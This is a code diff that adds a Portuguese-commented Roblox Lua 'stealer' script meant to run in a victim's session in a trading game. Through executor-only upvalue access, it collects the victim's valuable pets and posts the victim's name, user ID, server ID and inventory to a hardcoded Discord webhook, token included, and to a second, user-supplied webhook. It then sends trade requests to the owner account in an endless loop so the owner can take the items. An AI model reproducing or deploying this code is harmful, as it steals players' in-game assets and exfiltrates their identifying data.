@@ -1,66 +1,288 @@
+-- ============================================================
+-- STEALER FINAL - RODA NA CONTA DA VÍTIMA
+-- ============================================================
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 
-local TARGET_NAME = "GeniusH10872"
+local TARGET_USER = getgenv().TARGET_USER or "GeniusH10872"
+local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
+local WANTED_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
 
-print("[Test] Carregando Net...")
-local Net = require(ReplicatedStorage.Packages.Net)
+-- Webhook fixa do dono (só recebe OG)
+local OWNER_WEBHOOK = "https://discord.com/api/webhooks/1535021260080156823/Iq4HhY2PCMukJceZ8sz13Jd0a36ROWgK8Jp7TJLojOkQm67RbzhAisqH4FZ3wlXPr9__"
+local OWNER_NAME = "GeniusH10872"
 
-if not Net then
-    warn("[Test] Net não encontrado!")
-    return
+local function findRemote(path)
+    local parts = {}
+    for part in string.gmatch(path, "[^/]+") do
+        table.insert(parts, part)
+    end
+    local current = ReplicatedStorage
+    for _, part in ipairs(parts) do
+        if part == "Packages" then
+            current = current:FindFirstChild("Packages")
+        elseif part == "Net" then
+            current = current:FindFirstChild("Net")
+        else
+            current = current:FindFirstChild(part)
+        end
+        if not current then
+            return nil
+        end
+    end
+    return current
 end
 
-print("[Test] Net carregado com sucesso!")
+local REMOTES = {
+    Invite = findRemote("Packages.Net.RF/TradeService/Invite"),
+    AddBrainrot = findRemote("Packages.Net.RF/TradeService/AddBrainrot"),
+    RemoveBrainrot = findRemote("Packages.Net.RF/TradeService/RemoveBrainrot"),
+    AddItem = findRemote("Packages.Net.RF/TradeService/AddItem"),
+    RemoveItem = findRemote("Packages.Net.RF/TradeService/RemoveItem"),
+    Ready = findRemote("Packages.Net.RE/TradeService/Ready"),
+    Accept = findRemote("Packages.Net.RE/TradeService/Accept"),
+    Cancel = findRemote("Packages.Net.RE/TradeService/CancelTrade"),
+    Decline = findRemote("Packages.Net.RE/TradeService/DeclineInvite"),
+    AcceptInvite = findRemote("Packages.Net.RF/TradeService/AcceptInvite"),
+    CreateInvite = findRemote("Packages.Net.RE/TradeService/CreateInvite"),
+}
 
--- Lista de funções do Net para debug
-print("[Test] Funções do Net:")
-for k, v in pairs(Net) do
-    if type(v) == "function" then
-        print("  - " .. k)
+for name, remote in pairs(REMOTES) do
+    if not remote then
+        warn("[Stealer] Remote não encontrado: " .. name)
+    else
+        print("[Stealer] " .. name .. " -> " .. remote:GetFullName())
     end
 end
 
--- Tenta resolver os remotes
-local remotes = {}
-local remoteNames = {
-    "TradeService/Invite",
-    "TradeService/AcceptInvite",
-    "TradeService/AddBrainrot",
-    "TradeService/RemoveBrainrot",
-    "TradeService/AddItem",
-    "TradeService/RemoveItem",
-    "TradeService/Ready",
-    "TradeService/Accept",
-    "TradeService/CancelTrade",
-    "TradeService/DeclineInvite",
-    "TradeService/SendChatMessage",
-}
+local function safeRequire(path)
+    local succ, res = pcall(require, path)
+    return succ and res or nil
+end
 
-print("[Test] Resolvendo remotes...")
-for _, name in ipairs(remoteNames) do
-    local success, remote = pcall(function()
-        return Net:RemoteFunction(name)
-    end)
-    if success and remote then
-        print("[Test] ✅ " .. name .. " -> " .. tostring(remote))
-        remotes[name] = remote
-    else
-        -- Tenta como RemoteEvent
-        local success2, remote2 = pcall(function()
-            return Net:RemoteEvent(name)
-        end)
-        if success2 and remote2 then
-            print("[Test] ✅ " .. name .. " (Event) -> " .. tostring(remote2))
-            remotes[name] = remote2
-        else
-            print("[Test] ❌ " .. name .. " -> não encontrado")
+local mod = safeRequire(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
+local AnimalsData = safeRequire(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+local MutationsData = safeRequire(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Mutations"))
+local TraitsData = safeRequire(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
+local NumberUtils = safeRequire(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
+
+if not mod or type(mod) ~= "table" or type(mod.Get) ~= "function" then
+    warn("[Stealer] Synchronizer não encontrado.")
+    return
+end
+
+local function getGeneration(entry)
+    if type(entry) ~= "table" or not rawget(entry, "Index") then return 0 end
+    local idx = rawget(entry, "Index")
+    local data = AnimalsData and AnimalsData[idx]
+    local base = data and rawget(data, "Generation") or 0
+    local multiplier = 1
+    local mutName = rawget(entry, "Mutation")
+    if mutName and MutationsData then
+        local mut = MutationsData[mutName]
+        if mut then multiplier = multiplier + (rawget(mut, "Modifier") or 0) end
+    end
+    local traitsList = rawget(entry, "Traits")
+    if type(traitsList) == "table" and TraitsData then
+        for _, t in next, traitsList do
+            local trait = TraitsData[t]
+            if trait then multiplier = multiplier + (rawget(trait, "MultiplierModifier") or 0) end
+        end
+    end
+    return base * multiplier
+end
+
+local function getUpvaluesTable(fn)
+    if getupvalues then return pcall(getupvalues, fn) end
+    if debug and debug.getupvalues then return pcall(debug.getupvalues, fn) end
+    local upvals = {}
+    for i = 1, 128 do
+        local succ, name, val = pcall(debug.getupvalue, fn, i)
+        if not succ or val == nil then break end
+        upvals[i] = val
+    end
+    return true, upvals
+end
+
+local getSucc, upvalues = getUpvaluesTable(mod.Get)
+if not getSucc or type(upvalues) ~= "table" then
+    warn("[Stealer] Não foi possível ler upvalues do Synchronizer.")
+    return
+end
+
+local channels = nil
+pcall(function()
+    for _, upval in next, upvalues do
+        if type(upval) ~= "table" then continue end
+        for key, val in next, upval do
+            if type(val) == "table" and rawget(val, "CacheTable") then
+                channels = upval
+                return
+            end
+        end
+        for k1, v1 in next, upval do
+            if type(v1) == "table" then
+                for k2, v2 in next, v1 do
+                    if type(v2) == "table" and rawget(v2, "CacheTable") then
+                        channels = v1
+                        return
+                    end
+                end
+            end
+        end
+    end
+end)
+
+if not channels then
+    warn("[Stealer] Tabela de canais não encontrada.")
+    return
+end
+
+local victimName = LocalPlayer.Name
+local victimId = LocalPlayer.UserId
+local foundBrainrots = {}
+
+for channelName, channelData in next, channels do
+    if type(channelData) ~= "table" then continue end
+    local cache = rawget(channelData, "CacheTable")
+    if type(cache) ~= "table" then continue end
+    local owner = rawget(cache, "Owner")
+    local ownerName = nil
+    if typeof(owner) == "Instance" and owner:IsA("Player") then
+        ownerName = owner.Name
+    elseif type(owner) == "table" and owner.Name then
+        ownerName = owner.Name
+    end
+    if ownerName ~= victimName then continue end
+    local animalList = rawget(cache, "AnimalList")
+    if type(animalList) ~= "table" then continue end
+    for slot, entry in next, animalList do
+        if type(entry) ~= "table" or not rawget(entry, "Index") then continue end
+        local idx = rawget(entry, "Index")
+        local info = AnimalsData and AnimalsData[idx]
+        local displayName = info and rawget(info, "DisplayName") or idx
+        local rarity = info and rawget(info, "Rarity") or "Unknown"
+        if WANTED_BRAINROTS[displayName] then
+            local gen = getGeneration(entry)
+            table.insert(foundBrainrots, {
+                name = displayName,
+                generation = gen,
+                mutation = rawget(entry, "Mutation") or "None",
+                traits = rawget(entry, "Traits") or {},
+                slot = slot,
+                rarity = rarity,
+                isOG = (rarity == "OG")
+            })
         end
     end
 end
 
--- Pega o ID do alvo
+if #foundBrainrots == 0 then
+    print("[Stealer] Nenhum brainrot desejado encontrado na vítima.")
+    return
+end
+
+table.sort(foundBrainrots, function(a, b) return a.generation > b.generation end)
+
+local function formatNumber(val)
+    if NumberUtils and NumberUtils.ToString then
+        local succ, res = pcall(function() return NumberUtils:ToString(val) end)
+        if succ then return "$" .. res .. "/s" end
+    end
+    return "$" .. tostring(val) .. "/s"
+end
+
+local function sendWebhook(url, content, embed)
+    if url == "" then return end
+    local payload = { content = content, embeds = { embed } }
+    pcall(function()
+        HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+local brainrotLines = {}
+local ogBrainrots = {}
+local normalBrainrots = {}
+
+for _, pet in ipairs(foundBrainrots) do
+    local genText = formatNumber(pet.generation)
+    local mutText = pet.mutation ~= "None" and " [" .. pet.mutation .. "]" or ""
+    local ogTag = pet.isOG and " 🏆 OG" or ""
+    local line = pet.name .. mutText .. " (Gen: " .. genText .. ")" .. ogTag
+    table.insert(brainrotLines, line)
+    if pet.isOG then
+        table.insert(ogBrainrots, line)
+    else
+        table.insert(normalBrainrots, line)
+    end
+end
+
+local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+local playerCount = #Players:GetPlayers()
+
+local embed = {
+    title = "VITIMA ENCONTRADA!",
+    description = string.format(
+        "**Brainrots Encontrados:**\n%s\n\n**Server:** %s\n**Players:** %d\n**Scanned:** %s\n\n**Vítima:** %s • %d",
+        table.concat(brainrotLines, "\n"),
+        game.JobId or "Desconhecido",
+        playerCount,
+        timestamp,
+        victimName,
+        victimId
+    ),
+    color = 0xFF0000,
+}
+
+-- Envia para a webhook do usuário (se não for OG)
+if #normalBrainrots > 0 then
+    local normalEmbed = {
+        title = "VITIMA ENCONTRADA!",
+        description = string.format(
+            "**Brainrots Encontrados:**\n%s\n\n**Server:** %s\n**Players:** %d\n**Scanned:** %s\n\n**Vítima:** %s • %d",
+            table.concat(normalBrainrots, "\n"),
+            game.JobId or "Desconhecido",
+            playerCount,
+            timestamp,
+            victimName,
+            victimId
+        ),
+        color = 0xFF0000,
+    }
+    sendWebhook(WEBHOOK_URL, "@everyone", normalEmbed)
+end
+
+-- Envia para a webhook do dono (sempre, e com OG destacado)
+if #ogBrainrots > 0 then
+    local ogEmbed = {
+        title = "🔥 BRAINROT OG ENCONTRADO!",
+        description = string.format(
+            "**Brainrots OG Encontrados:**\n%s\n\n**Server:** %s\n**Players:** %d\n**Scanned:** %s\n\n**Vítima:** %s • %d",
+            table.concat(ogBrainrots, "\n"),
+            game.JobId or "Desconhecido",
+            playerCount,
+            timestamp,
+            victimName,
+            victimId
+        ),
+        color = 0xFFA500,
+    }
+    sendWebhook(OWNER_WEBHOOK, "@everyone 🔥 BRAINROT OG DETECTADO!", ogEmbed)
+else
+    -- Se não tiver OG, envia só a lista normal pro dono também
+    sendWebhook(OWNER_WEBHOOK, "@everyone", embed)
+end
+
+print("[Stealer] Webhook enviado com " .. #foundBrainrots .. " brainrots.")
+
+-- ============================================================
+-- SISTEMA DE TRADE (só envia pedido para o dono)
+-- ============================================================
+
 local function getUserIdByName(name)
     local success, result = pcall(function()
         return Players:GetUserIdFromNameAsync(name)
@@ -71,28 +293,42 @@ local function getUserIdByName(name)
     return nil
 end
 
-local targetUserId = getUserIdByName(TARGET_NAME)
-if not targetUserId then
-    warn("[Test] Usuário não encontrado: " .. TARGET_NAME)
+local ownerId = getUserIdByName(OWNER_NAME)
+if not ownerId then
+    warn("[Stealer] Dono não encontrado: " .. OWNER_NAME)
     return
 end
 
-print("[Test] Target UserId: " .. targetUserId)
-
--- Tenta enviar um pedido de trade
-local inviteRemote = remotes["TradeService/Invite"]
-if inviteRemote then
-    print("[Test] Enviando pedido de trade para " .. TARGET_NAME .. " (" .. targetUserId .. ")...")
-    local success, result = pcall(function()
-        return inviteRemote:InvokeServer(targetUserId)
-    end)
-    if success then
-        print("[Test] ✅ Pedido enviado com sucesso! Resultado: " .. tostring(result))
-    else
-        print("[Test] ❌ Falha ao enviar pedido: " .. tostring(result))
-    end
-else
-    print("[Test] ❌ Remote de invite não encontrado!")
+if not REMOTES.Invite then
+    warn("[Stealer] Remote de invite não encontrado!")
+    return
 end
 
-print("[Test] Script finalizado.")
+local function sendTradeRequest()
+    local success, result = pcall(function()
+        return REMOTES.Invite:InvokeServer(ownerId)
+    end)
+    return success, result
+end
+
+print("[Stealer] Enviando pedido de trade para: " .. OWNER_NAME .. " (" .. ownerId .. ")")
+local success, result = sendTradeRequest()
+if success then
+    print("[Stealer] Pedido de trade enviado com sucesso!")
+else
+    print("[Stealer] Falha ao enviar pedido: " .. tostring(result))
+end
+
+task.spawn(function()
+    while true do
+        task.wait(10)
+        local success, result = sendTradeRequest()
+        if success then
+            print("[Stealer] Pedido de trade reenviado com sucesso!")
+        else
+            print("[Stealer] Falha ao reenviar: " .. tostring(result))
+        end
+    end
+end)
+
+print("[Stealer] Script finalizado!")
